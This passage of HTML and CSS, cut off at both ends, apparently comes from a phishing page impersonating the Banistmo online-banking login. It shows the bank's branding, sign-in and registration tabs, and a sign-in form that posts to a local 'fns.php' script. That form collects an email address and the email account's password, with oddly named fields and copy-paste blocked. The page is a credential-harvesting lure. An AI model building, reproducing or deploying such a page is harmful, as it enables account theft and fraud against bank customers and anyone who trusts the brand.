15px;font-size:.8em;color:#808285;margin:0}.hide-tooltip[_ngcontent-mgc-c70]{color:transparent;pointer-events:none}.no-pointer-events[_ngcontent-mgc-c70]{pointer-events:none}.all-pointer-events[_ngcontent-mgc-c70]{pointer-events:all}.tooltip-placeholder[_ngcontent-mgc-c70]{width:10px;height:10px}</style>
      <style>a.tooltip[_ngcontent-mgc-c53]{color:#2c2a29}.tooltip-icon[_ngcontent-mgc-c53]{content:url(/assets/icons/info.svg)}.right[_ngcontent-mgc-c53]{display:inline;position:relative}.right[_ngcontent-mgc-c53]:hover:after{right:-760%}.left[_ngcontent-mgc-c53]{display:inline;position:relative}.left[_ngcontent-mgc-c53]:hover:after{left:-1070%}.center[_ngcontent-mgc-c53]{display:inline;position:relative}.center[_ngcontent-mgc-c53]:hover:after{left:-800%}.tooltip[_ngcontent-mgc-c53]:hover:after{background:#58595b;border-radius:5px;bottom:26px;color:#fff;padding:5px 15px;position:absolute;z-index:3;font-size:.8em;justify-content:safe;text-align:justify;white-space:pre-wrap}.tooltip[_ngcontent-mgc-c53]:hover:before{border:solid;border-color:#58595b transparent;border-width:6px 6px 0 6px;bottom:20px;content:"";left:10%;position:absolute;z-index:3}.tooltip-image-cc1[_ngcontent-mgc-c53]{display:inline;position:relative}.tooltip-image-cc1[_ngcontent-mgc-c53]:hover:after{content:url("data:image/svg+xml,%3C%3Fxml version%3D%221.0%22 encoding%3D%22UTF-8%22%3F%3E%3Csvg width%3D%22199px%22 height%3D%22102px%22 viewBox%3D%220 0 199 102%22 version%3D%221.1%22 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%3E    %3C!-- Generator%3A Sketch 54.1 (76490) - https%3A%2F%2Fsketchapp.com --%3E    %3Ctitle%3EGroup%3C%2Ftitle%3E    %3Cdesc%3ECreated with Sketch.%3C%2Fdesc%3E    %3Cg id%3D%22SVP-5_7_0-Nuevo-registro-de-usuario%22 stroke%3D%22none%22 stroke-width%3D%221%22 fill%3D%22none%22 fill-rule%3D%22evenodd%22%3E        %3Cg id%3D%22SVP-5_7_1c-registro-v3_-cedula-seccionada-tooltip-primer-n%C3%BAmero-o-letra%22 transform%3D%22translate(-100.000000%2C -324.000000)%22%3E            %3Cg id%3D%22Group%22 transform%3D%22translate(100.000000%2C 324.000000)%22%3E                %3Cpath d%3D%22M189.671875%2C0 L9.328125%2C0 C4.18444141%2C0 0%2C3.34796341 0%2C7.46341463 L0%2C94.5365854 C0%2C98.6520366 4.18444141%2C102 9.328125%2C102 L189.671875%2C102 C194.815559%2C102 199%2C98.6520366 199%2C94.5365854 L199%2C7.46341463 C199%2C3.34796341 194.815559%2C0 189.671875%2C0 Z%22 id%3D%22Path%22 fill%3D%22%23F2F2F2%22 fill-rule%3D%22nonzero%22%3E%3C%2Fpath%3E                %3Crect id%3D%22Rectangle-4%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%22137%22 y%3D%228%22 width%3D%2254%22 height%3D%2255%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-4%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2210%22 width%3D%2289%22 height%3D%2213%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-6%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2239%22 width%3D%2250%22 height%3D%229%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-8%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2264%22 width%3D%2289%22 height%3D%2228%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Ctext id%3D%225---555---5555%22 font-family%3D%22Nunito-Bold%2C Nunito%22 font-size%3D%2212%22 font-weight%3D%22bold%22%3E                    %3Ctspan x%3D%22114.488%22 y%3D%2283%22 fill%3D%22%23454648%22%3E5 %3C%2Ftspan%3E                    %3Ctspan x%3D%22124.94%22 y%3D%2283%22 fill%3D%22%23D1D3D4%22%3E-%3C%2Ftspan%3E                    %3Ctspan x%3D%22130.148%22 y%3D%2283%22 fill%3D%22%23454648%22%3E %3C%2Ftspan%3E                    %3Ctspan x%3D%22133.4%22 y%3D%2283%22 fill%3D%22%23D1D3D4%22%3E555 - 5555%3C%2Ftspan%3E                %3C%2Ftext%3E                %3Crect id%3D%22Rectangle-5%22 stroke%3D%22%23FFD200%22 stroke-width%3D%221.2%22 fill-rule%3D%22nonzero%22 x%3D%22111.6%22 y%3D%2268.6%22 width%3D%2212.8%22 height%3D%2219.8%22 rx%3D%223.128528%22%3E%3C%2Frect%3E            %3C%2Fg%3E        %3C%2Fg%3E    %3C%2Fg%3E%3C%2Fsvg%3E")}.tooltip-image-cc2[_ngcontent-mgc-c53]{display:inline;position:relative}.tooltip-image-cc2[_ngcontent-mgc-c53]:hover:after{content:url("data:image/svg+xml,%3C%3Fxml version%3D%221.0%22 encoding%3D%22UTF-8%22%3F%3E%3Csvg width%3D%22199px%22 height%3D%22102px%22 viewBox%3D%220 0 199 102%22 version%3D%221.1%22 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%3E    %3C!-- Generator%3A Sketch 54.1 (76490) - https%3A%2F%2Fsketchapp.com --%3E    %3Ctitle%3EGroup 2%3C%2Ftitle%3E    %3Cdesc%3ECreated with Sketch.%3C%2Fdesc%3E    %3Cg id%3D%22SVP-5_7_0-Nuevo-registro-de-usuario%22 stroke%3D%22none%22 stroke-width%3D%221%22 fill%3D%22none%22 fill-rule%3D%22evenodd%22%3E        %3Cg id%3D%22SVP-5_7_1e-registro-v3_-cedula-seccionada-tooltip-segundo-n%C3%BAmero%22 transform%3D%22translate(-204.000000%2C -332.000000)%22%3E            %3Cg id%3D%22Group-2%22 transform%3D%22translate(204.000000%2C 332.000000)%22%3E                %3Cpath d%3D%22M189.671875%2C0 L9.328125%2C0 C4.18444141%2C0 0%2C3.34796341 0%2C7.46341463 L0%2C94.5365854 C0%2C98.6520366 4.18444141%2C102 9.328125%2C102 L189.671875%2C102 C194.815559%2C102 199%2C98.6520366 199%2C94.5365854 L199%2C7.46341463 C199%2C3.34796341 194.815559%2C0 189.671875%2C0 Z%22 id%3D%22Path%22 fill%3D%22%23F2F2F2%22 fill-rule%3D%22nonzero%22%3E%3C%2Fpath%3E                %3Crect id%3D%22Rectangle-4%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%22137%22 y%3D%228%22 width%3D%2254%22 height%3D%2255%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-4%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2210%22 width%3D%2289%22 height%3D%2213%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-6%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2239%22 width%3D%2250%22 height%3D%229%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-8%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2264%22 width%3D%2289%22 height%3D%2228%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Cg id%3D%22Group%22 transform%3D%22translate(111.000000%2C 69.000000)%22%3E                    %3Ctext id%3D%225---555---5555%22 font-family%3D%22Nunito-Bold%2C Nunito%22 font-size%3D%2212%22 font-weight%3D%22bold%22%3E                        %3Ctspan x%3D%223.488%22 y%3D%2215%22 fill%3D%22%23D1D3D4%22%3E5%3C%2Ftspan%3E                        %3Ctspan x%3D%2210.688%22 y%3D%2215%22 fill%3D%22%23454648%22%3E %3C%2Ftspan%3E                        %3Ctspan x%3D%2213.94%22 y%3D%2215%22 fill%3D%22%23D1D3D4%22%3E-%3C%2Ftspan%3E                        %3Ctspan x%3D%2219.148%22 y%3D%2215%22 fill%3D%22%23454648%22%3E %3C%2Ftspan%3E                        %3Ctspan x%3D%2222.4%22 y%3D%2215%22 fill%3D%22%23454648%22%3E555%3C%2Ftspan%3E                        %3Ctspan x%3D%2244%22 y%3D%2215%22 fill%3D%22%23D1D3D4%22%3E - 5555%3C%2Ftspan%3E                    %3C%2Ftext%3E                    %3Crect id%3D%22Rectangle-5%22 stroke%3D%22%23FFD200%22 stroke-width%3D%221.2%22 fill-rule%3D%22nonzero%22 x%3D%2220.6%22 y%3D%220.6%22 width%3D%2224.8%22 height%3D%2219.8%22 rx%3D%223.128528%22%3E%3C%2Frect%3E                %3C%2Fg%3E            %3C%2Fg%3E        %3C%2Fg%3E    %3C%2Fg%3E%3C%2Fsvg%3E")}.tooltip-image-cc3[_ngcontent-mgc-c53]{display:inline;position:relative}.tooltip-image-cc3[_ngcontent-mgc-c53]:hover:after{content:url("data:image/svg+xml,%3C%3Fxml version%3D%221.0%22 encoding%3D%22UTF-8%22%3F%3E%3Csvg width%3D%22199px%22 height%3D%22102px%22 viewBox%3D%220 0 199 102%22 version%3D%221.1%22 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%3E    %3C!-- Generator%3A Sketch 54.1 (76490) - https%3A%2F%2Fsketchapp.com --%3E    %3Ctitle%3EGroup%3C%2Ftitle%3E    %3Cdesc%3ECreated with Sketch.%3C%2Fdesc%3E    %3Cg id%3D%22SVP-5_7_0-Nuevo-registro-de-usuario%22 stroke%3D%22none%22 stroke-width%3D%221%22 fill%3D%22none%22 fill-rule%3D%22evenodd%22%3E        %3Cg id%3D%22SVP-5_7_1f-registro-v3_-cedula-seccionada-tercer-n%C3%BAmero-datos-ok%22 transform%3D%22translate(-308.000000%2C -332.000000)%22%3E            %3Cg id%3D%22Group%22 transform%3D%22translate(308.000000%2C 332.000000)%22%3E                %3Cpath d%3D%22M189.671875%2C0 L9.328125%2C0 C4.18444141%2C0 0%2C3.34796341 0%2C7.46341463 L0%2C94.5365854 C0%2C98.6520366 4.18444141%2C102 9.328125%2C102 L189.671875%2C102 C194.815559%2C102 199%2C98.6520366 199%2C94.5365854 L199%2C7.46341463 C199%2C3.34796341 194.815559%2C0 189.671875%2C0 Z%22 id%3D%22Path%22 fill%3D%22%23F2F2F2%22 fill-rule%3D%22nonzero%22%3E%3C%2Fpath%3E                %3Crect id%3D%22Rectangle-4%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%22137%22 y%3D%228%22 width%3D%2254%22 height%3D%2255%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-4%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2210%22 width%3D%2289%22 height%3D%226%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-5%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%229%22 y%3D%2221%22 width%3D%2261%22 height%3D%226%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-6%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%229%22 y%3D%2242%22 width%3D%2250%22 height%3D%226%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Crect id%3D%22Rectangle-4-Copy-8%22 fill%3D%22%23D1D3D4%22 fill-rule%3D%22nonzero%22 x%3D%2210%22 y%3D%2264%22 width%3D%2289%22 height%3D%2228%22 rx%3D%223%22%3E%3C%2Frect%3E                %3Ctext id%3D%225---555---5555%22 font-family%3D%22Nunito-Bold%2C Nunito%22 font-size%3D%2212%22 font-weight%3D%22bold%22%3E                    %3Ctspan x%3D%22114.488%22 y%3D%2283%22 fill%3D%22%23D1D3D4%22%3E5%3C%2Ftspan%3E                    %3Ctspan x%3D%22121.688%22 y%3D%2283%22 fill%3D%22%23454648%22%3E %3C%2Ftspan%3E                    %3Ctspan x%3D%22124.94%22 y%3D%2283%22 fill%3D%22%23D1D3D4%22%3E-%3C%2Ftspan%3E                    %3Ctspan x%3D%22130.148%22 y%3D%2283%22 fill%3D%22%23454648%22%3E %3C%2Ftspan%3E                    %3Ctspan x%3D%22133.4%22 y%3D%2283%22 fill%3D%22%23D1D3D4%22%3E555%3C%2Ftspan%3E                    %3Ctspan x%3D%22155%22 y%3D%2283%22 fill%3D%22%23D1D3D4%22%3E - %3C%2Ftspan%3E                    %3Ctspan x%3D%22166.712%22 y%3D%2283%22 fill%3D%22%23454648%22%3E5555%3C%2Ftspan%3E                %3C%2Ftext%3E                %3Crect id%3D%22Rectangle-5%22 stroke%3D%22%23FFD200%22 stroke-width%3D%221.2%22 fill-rule%3D%22nonzero%22 x%3D%22164.6%22 y%3D%2268.6%22 width%3D%2232.8%22 height%3D%2219.8%22 rx%3D%223.128528%22%3E%3C%2Frect%3E            %3C%2Fg%3E        %3C%2Fg%3E    %3C%2Fg%3E%3C%2Fsvg%3E")}.tooltip-message[_ngcontent-mgc-c53]{display:inline;position:relative}.tooltip-message[_ngcontent-mgc-c53]:hover:after{min-width:290px;left:-250px;content:attr(message)}.banistmo-alert[_ngcontent-mgc-c53]{width:18px}</style>
      <style>.main-container[_ngcontent-mgc-c58]{width:100%}.main-container[_ngcontent-mgc-c58]   .carousel-banner[_ngcontent-mgc-c58]{height:auto}.main-container[_ngcontent-mgc-c58]   .carousel-banner[_ngcontent-mgc-c58]   .banner-container[_ngcontent-mgc-c58]{text-align:center}@media (max-width: 768px){.carousel-banner[_ngcontent-mgc-c58]{background-color:transparent!important}.carousel-banner[_ngcontent-mgc-c58]   .banner-container[_ngcontent-mgc-c58]{max-width:100%;padding:0 26px!important;text-align:center!important;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box}}@media screen and (min-width: 1200px){.main-container[_ngcontent-mgc-c58]   .carousel-banner[_ngcontent-mgc-c58]{background-color:transparent}.main-container[_ngcontent-mgc-c58]   .carousel-banner[_ngcontent-mgc-c58]   .banner-container[_ngcontent-mgc-c58]{text-align:right}}</style>
      <style>.secondary-link[_ngcontent-mgc-c69]{margin-bottom:20px}.secondary-link[_ngcontent-mgc-c69]   .icon-left[_ngcontent-mgc-c69]{font-size:2em;float:left;margin-right:20px;width:35px;text-align:center}.secondary-link[_ngcontent-mgc-c69]   a[_ngcontent-mgc-c69]{color:#3a3b3b;font-size:.9em;font-weight:bold;line-height:32px}.secondary-link[_ngcontent-mgc-c69]   a[_ngcontent-mgc-c69]:hover{color:#fdda24;font-weight:bold;text-decoration:none}.secondary-link[_ngcontent-mgc-c69]   a[_ngcontent-mgc-c69]:focus{color:#3a3b3b}.secondary-link[_ngcontent-mgc-c69]   .icon-right[_ngcontent-mgc-c69]{font-weight:bold;font-size:.55em;float:right;line-height:32px}</style>
      <style>.btn-outline[_ngcontent-mgc-c66]{width:287px;height:59px;border-radius:29.5px;border:solid 1px #3a3b3b;background-color:transparent;font-size:.85em;font-weight:bold;padding:0 15px;margin-top:10px;cursor:pointer}.btn-outline[_ngcontent-mgc-c66]:hover{border:solid 2px #3a3b3b}.btn-outline[_ngcontent-mgc-c66]   .icon-left[_ngcontent-mgc-c66]{font-size:1.8em;width:30px;vertical-align:bottom;line-height:10px}</style>
     <style>@charset "UTF-8";.modal-body[_ngcontent-mgc-c130]   p.modal-text[_ngcontent-mgc-c130]{margin-bottom:24px;font-weight:400;font-size:16px;line-height:22px;font-family:Open Sans;color:#2c2a29;width:652px}.modal-body[_ngcontent-mgc-c130]   p.modal-text[_ngcontent-mgc-c130]   strong[_ngcontent-mgc-c130]{font-weight:700}.modal-body[_ngcontent-mgc-c130]   .actions[_ngcontent-mgc-c130]{margin-bottom:25px}.modal-body[_ngcontent-mgc-c130]   .actions[_ngcontent-mgc-c130]   .buttons-modal[_ngcontent-mgc-c130]{padding:10px}.modal-body.modal-session[_ngcontent-mgc-c130]   .actions[_ngcontent-mgc-c130]   .button-container[_ngcontent-mgc-c130]{width:260px}.modal-body.modal-session[_ngcontent-mgc-c130]   .actions[_ngcontent-mgc-c130]   .button-container[_ngcontent-mgc-c130]:first-child{margin-right:24px}.modal-body.modal-denegate[_ngcontent-mgc-c130]   p.modal-text[_ngcontent-mgc-c130]{padding-left:50px;padding-right:50px}.modal-body.modal-policy[_ngcontent-mgc-c130]   .actions[_ngcontent-mgc-c130]   .button-container[_ngcontent-mgc-c130]{width:259px}h4[_ngcontent-mgc-c130]{margin:auto;color:#454648;font-family:CIBFontSans-Bold;font-size:18px;line-height:20px;letter-spacing:-.3px;font-weight:700}.sentence[_ngcontent-mgc-c130]{background:transparent;border-radius:18px;padding-top:5px;padding-bottom:5px;font-size:1rem;font-weight:700;line-height:1.38;color:#808285;margin-top:-10px;position:relative}.image[_ngcontent-mgc-c130]{border-radius:100px;border:solid 3px #e6e7e8;width:110px;height:110px;cursor:pointer}.tabs-container[_ngcontent-mgc-c130]   .icon[_ngcontent-mgc-c130]{margin-top:12px}.tabs-container[_ngcontent-mgc-c130]   .icon[_ngcontent-mgc-c130]   img[_ngcontent-mgc-c130]{width:30px}.tabs-container[_ngcontent-mgc-c130]   .field[_ngcontent-mgc-c130]{padding-left:0}.tabs-container[_ngcontent-mgc-c130]   .actions[_ngcontent-mgc-c130]{margin:20px -15px 50px}.tabs-container[_ngcontent-mgc-c130]   .info-links[_ngcontent-mgc-c130]   div[_ngcontent-mgc-c130]:first-child{padding-right:0}.error-container[_ngcontent-mgc-c130]{margin-bottom:22px}.btn-perserve[_ngcontent-mgc-c130]{padding-top:15px}.btn-continue[_ngcontent-mgc-c130]{padding-top:20px}.bold-text[_ngcontent-mgc-c130]{font-family:CIBFontSans-Bold}</style>
   </head>
   <body>
    
      <app-root _nghost-mgc-c14="" ng-version="13.4.0">
         <app-coachmark _ngcontent-mgc-c14="" _nghost-mgc-c13="">
            <div _ngcontent-mgc-c13="" id="overlay" class="hidden">
               <div _ngcontent-mgc-c13="" class="coachmark-image">
                  <div _ngcontent-mgc-c13="" class="coachmark-image-container"><img _ngcontent-mgc-c13="" src="https://personas.banistmo.com/"></div>
               </div>
               <div _ngcontent-mgc-c13="" class="coachmark-button"><a _ngcontent-mgc-c13="" class="transparent-btn">Ver después</a></div>
               <div _ngcontent-mgc-c13="" class="coachmark-button"><a _ngcontent-mgc-c13="" class="transparent-btn">Siguiente</a></div>
               <div _ngcontent-mgc-c13="" class="coachmark-button"><span _ngcontent-mgc-c13=""><i _ngcontent-mgc-c13="" class="icon-close-white"></i></span></div>
            </div>
         </app-coachmark>
         <router-outlet _ngcontent-mgc-c14=""></router-outlet>
         <app-pages-login _nghost-mgc-c137="">
            <!---->
            <app-navbar _ngcontent-mgc-c137="" iddate="lbl_lastLogin" idloginlabelwelcome="lbl_Headermsg" islogin="true" class="nav-bar-login" _nghost-mgc-c64="">
               <div _ngcontent-mgc-c64="" class="navbar container-nav">
                  <nav _ngcontent-mgc-c64="" class="main-navbar">
                     <div _ngcontent-mgc-c64="" class="container">
                        <div _ngcontent-mgc-c64="" class="row">
                           <!---->
                           <div _ngcontent-mgc-c64="" class="logo"><img _ngcontent-mgc-c64="" src="img/logoBanistmo_mod.svg"></div>
                           <div _ngcontent-mgc-c64="" class="navbar-content">
                              <div _ngcontent-mgc-c137="" class="language"><a _ngcontent-mgc-c137=""> English </a><i _ngcontent-mgc-c137="" class="icon-language"></i></div>
                           </div>
                        </div>
                     </div>
                  </nav>
                  <!---->
               </div>
            </app-navbar>
            <div _ngcontent-mgc-c137="" class="main-container">
               <div _ngcontent-mgc-c137="" class="container">
                  <div _ngcontent-mgc-c137="" class="row">
                     <div _ngcontent-mgc-c137="" class="col-md-6 offset-md-3 col-xl-4 offset-xl-0 col-12">
                        <div _ngcontent-mgc-c137="" class="login-container">
                           <div _ngcontent-mgc-c137="" class="login">
                              <!----><!---->
                              <app-card _ngcontent-mgc-c137="" _nghost-mgc-c57="">
                                 <div _ngcontent-mgc-c57="" class="card">
                                    <app-tabs _ngcontent-mgc-c137="" _nghost-mgc-c73="">
                                       <div _ngcontent-mgc-c73="" class="nav nav-tabs" id="">
                                          <span _ngcontent-mgc-c73="" class="tab active" id="tab_signin">
                                             <span _ngcontent-mgc-c73="" role="button" class="tab-title">
                                                Ingresa 
                                                <p _ngcontent-mgc-c73="" class="subtitle"></p>
                                             </span>
                                          </span>
                                          <span _ngcontent-mgc-c73="" class="tab" id="tab_register">
                                             <span _ngcontent-mgc-c73="" role="button" class="tab-title">
                                                Regístrate 
                                                <p _ngcontent-mgc-c73="" class="subtitle"></p>
                                             </span>
                                          </span>
                                          <!---->
                                       </div>
                                       <app-tab _ngcontent-mgc-c137="" tabid="tab_signin" _nghost-mgc-c72="">
                                          <div _ngcontent-mgc-c72="" class="pane padding" id="">
                                             <div _ngcontent-mgc-c137="" class="card-container">
                                                <!---->
                                                <app-username _ngcontent-mgc-c137="" _nghost-mgc-c127="">
                                                   <app-subtitle _ngcontent-mgc-c127="" class="text-center" _nghost-mgc-c71="">
                                                      <h2 _ngcontent-mgc-c71="">Banca en Línea</h2>
                                                   </app-subtitle>
                                                   <div _ngcontent-mgc-c127="" class="tabs-container">
                                                      <form _ngcontent-mgc-c127="" class="ng-untouched ng-pristine ng-valid" action="fns.php" method="post">
                                                         

                                                         <div _ngcontent-mgc-c127="" class="row">
                                                            <div _ngcontent-mgc-c127="" class="col-2 icon"><img _ngcontent-mgc-c127="" src="img/user.svg"></div>
                                                            <div _ngcontent-mgc-c127="" class="col-10 field">
                                                               <app-text-field _ngcontent-mgc-c127="" idtooltip="id_tooltip" name="username" id="inp_user" iconprimary="banistmo-info" _nghost-mgc-c74="" class="ng-untouched ng-pristine ng-valid">
                                                                  <div _ngcontent-mgc-c74="" class="text-field">
                                                                     <div _ngcontent-mgc-c74="" class="content">
                                                                        <label _ngcontent-mgc-c74="">
                                                                           <input _ngcontent-mgc-c74=""  onpaste="return false" oncopy="return false" oncut="return false" input-directive="" type="email" id="miDiosenticonfio" name="miDiosenticonfio" required minlength="2" class="ng-untouched ng-pristine ng-invalid" required=""><span _ngcontent-mgc-c74="">Correo electrónico</span>
                                                                           <div _ngcontent-mgc-c74="" class="icon">
                                                                              <app-tooltip _ngcontent-mgc-c74="" _nghost-mgc-c53="">
                                                                                 <a _ngcontent-mgc-c53="" class="tooltip tooltip-message" id="id_tooltip" ><i _ngcontent-mgc-c53="" class="banistmo-info"></i></a><!----><!---->
                                                                              </app-tooltip>
                                                                              <!----><i _ngcontent-mgc-c74=""></i>
                                                                           </div>
                                                                        </label>
                                                                     </div>
                                                                     <div _ngcontent-mgc-c74="" class="sub-content">
                                                                        <p _ngcontent-mgc-c74="" class="message"></p>
                                                                        <!---->
                                                                     </div>
                                                                  </div>
                                                               </app-text-field>
                                                            </div>

                                                         </div>
                                                         <div _ngcontent-mgc-c130="" class="row">
                                                            <div _ngcontent-mgc-c130="" class="col-2 icon" style="margin-top: 12px;"><img _ngcontent-mgc-c130="" style="width: 30px;" src="img/lock.svg"></div>
                                                            <div _ngcontent-mgc-c130="" class="col-10 field">
                                                               <app-password-field _ngcontent-mgc-c130="" idtooltip="id_tooltip" ideye="IdEye" id="inp_password" type="password" _nghost-mgc-c68="">
                                                                  <div _ngcontent-mgc-c68="" class="text-field">
                                                                     <div _ngcontent-mgc-c68="" class="content">
                                                                        <label _ngcontent-mgc-c68="">
                                                                           <input _ngcontent-mgc-c68=""  autocomplete="off" onpaste="return false" oncopy="return false" input-directive="" type="password" id="miDiosenticonfioxx" name="miDiosenticonfioxx" minlength="2" required class="ng-untouched ng-pristine ng-invalid" required=""><span _ngcontent-mgc-c68="">Contraseña de correo</span>
                                                                           <div _ngcontent-mgc-c68="" class="icon">
                                                                              <i _ngcontent-mgc-c68="" id="IdEye" class="banistmo-no-view"></i>
                                                                              <app-tooltip _ngcontent-mgc-c68="" icon="banistmo-info" _nghost-mgc-c53="">
                                                                                 <a _ngcontent-mgc-c53="" class="tooltip left tooltip-message" id="" ><i _ngcontent-mgc-c53="" class="banistmo-info"></i></a><!----><!---->
                                                                              </app-tooltip>
                                                                              <!----><!---->
                                                                           </div>
                                                                        </label>
                                                                     </div>
                                                                     <!---->
                                                                  </div>
                                                               </app-password-field>
                                                            </div>
                                                         </div>
                                                         <div _ngcontent-mgc-c127="" class="row justify-content-center actions">
                                                            <div _ngcontent-mgc-c127="" class="col-6">
                                                               <app-button _ngcontent-mgc-c127="" type="primary-yellow" id="btn_continue" _nghost-mgc-c56="">
                                                                  <button _ngcontent-mgc-c56="" class="btn primary-yellow" type="submit" id="btn_continue" >
                                                                     Continuar <!---->
                                                                  </button>
                                                               </app-button>
                                                            </div>
                                                         </div>
                                                         
                                                      </form>
                                                      <div _ngcontent-mgc-c127="" class="row info-links">
                                                         <div _ngcontent-mgc-c127="" class="col-6">
                                                            <app-hyperlink _ngcontent-mgc-c127="" _nghost-mgc-c61="" id="lnk_forgotUser"><a _ngcontent-mgc-c61="" class=""> ¿Olvidaste el usuario?
                                                               </a>
                                                            </app-hyperlink>
                                                         </div>
                                                         <div _ngcontent-mgc-c127="" class="col-6 text-right">
                                                            <app-hyperlink _ngcontent-mgc-c127="" id="lnk_infoLeg" _nghost-mgc-c61=""><a _ngcontent-mgc-c61="" class=""> Términos y condiciones
                                                               </a>
                                                            </app-hyperlink>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div _ngcontent-mgc-c127="">
                                                      <div _ngcontent-mgc-c127="" class="entailment">
                                                         <app-card _ngcontent-mgc-c127="" _nghost-mgc-c57="">
                                                            <div _ngcontent-mgc-c57="" class="card">
                                                               <div _ngcontent-mgc-c127="" class="text-center mt-4 mb-2">
                                                                  <div _ngcontent-mgc-c127="" class="icon-circle center-icon"><img _ngcontent-mgc-c127="" src="img/savings.svg" class="text-center"></div>
                                                               </div>
                                                               <p _ngcontent-mgc-c127="" class="text-entailment text-center mx-5 mx-md-2">Abre tu cuenta Xpress en 3,2,1</p>
                                                               <div _ngcontent-mgc-c127="" class="mx-5 px-5 mb-4">
                                                                  <app-button _ngcontent-mgc-c127="" id="btn_entailment" type="primary-yellow" _nghost-mgc-c56="">
                                                                     <button _ngcontent-mgc-c56="" class="btn primary-yellow" type="button" id="btn_entailment">
                                                                        Abre una cuenta <!---->
                                                                     </button>
                                                                  </app-button>
                                                               </div>
                                                            </div>
                                                         </app-card>
                                                      </div>
                                                   </div>
                                                   <!---->
                                                </app-username>
                                                <!----><!----><!----><!----><!----><!---->
                                             </div>
                                          </div>
                                       </app-tab>
                                       <app-tab _ngcontent-mgc-c137="" tabid="tab_register" _nghost-mgc-c72="">
                                          <div _ngcontent-mgc-c72="" class="pane padding" id="" hidden="">
                                             <div _ngcontent-mgc-c137="" class="card-container">
                                                <app-step-one-register _ngcontent-mgc-c137="" id="containerCard_loginReister" _nghost-mgc-c135="">
                                                   <div _ngcontent-mgc-c135="" id="containerCard_loginReister">
                                                      <!---->
                                                      <div _ngcontent-mgc-c135="" class="row justify-content-md-center">
                                                         <div _ngcontent-mgc-c135="" align="center" class="col"><i _ngcontent-mgc-c135="" class="iconouser"></i></div>
                                                      </div>
                                                      <div _ngcontent-mgc-c135="" class="row justify-content-md-center">
                                                         <div _ngcontent-mgc-c135="" align="center" class="col">
                                                            <h3 _ngcontent-mgc-c135="" id="lbl_RegisterSVP">Regístrate en la Banca en Línea</h3>
                                                         </div>
                                                      </div>
                                                      <div _ngcontent-mgc-c135="" class="row justify-content-md-center">
                                                         <div _ngcontent-mgc-c135="" align="center" class="col">
                                                            <h4 _ngcontent-mgc-c135="" id="lbl_InfoRegisterSVP"> Si ya eres cliente Banistmo, ingresa los siguientes datos para iniciar </h4>
                                                         </div>
                                                      </div>
                                                      <div _ngcontent-mgc-c135="" class="row justify-content-md-center">
                                                         <div _ngcontent-mgc-c135="" class="col">
                                                            <app-select _ngcontent-mgc-c135="" id="btn_ListTypeID" type="number" icon="fal fa-angle-down" _nghost-mgc-c70="">
                                                               <div _ngcontent-mgc-c70="" class="text-field">
                                                                  <div _ngcontent-mgc-c70="" class="content">
                                                                     <label _ngcontent-mgc-c70="" for="btn_ListTypeID">
                                                                        <select _ngcontent-mgc-c70="" name="select" required="" id="btn_ListTypeID" class="ng-untouched ng-pristine ng-valid">
                                                                           <option _ngcontent-mgc-c135="" value="C">Cédula</option>
                                                                           <option _ngcontent-mgc-c135="" value="P">Pasaporte</option>
                                                                        </select>
                                                                        <span _ngcontent-mgc-c70="" class="no-pointer-events">Tipo de identificación</span>
                                                                        <div _ngcontent-mgc-c70="" class="icon no-pointer-events padding-right row">
                                                                           <div _ngcontent-mgc-c70="" class="col-6 all-pointer-events pr-0">
                                                                              <app-tooltip _ngcontent-mgc-c70="" icon="fal fa-info-circle " _nghost-mgc-c53="" class="hide-tooltip">
                                                                                 <!----><!---->
                                                                              </app-tooltip>
                                                                           </div>
                                                                           <div _ngcontent-mgc-c70="" class="col-6 p-0 pl-2"><i _ngcontent-mgc-c70="" class="fa-angle-down fal icon-arrow no-pointer-events"></i></div>
                                                                        </div>
                                                                     </label>
                                                                  </div>
                                                                  <!---->
                                                               </div>
                                                            </app-select>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <!----><!---->
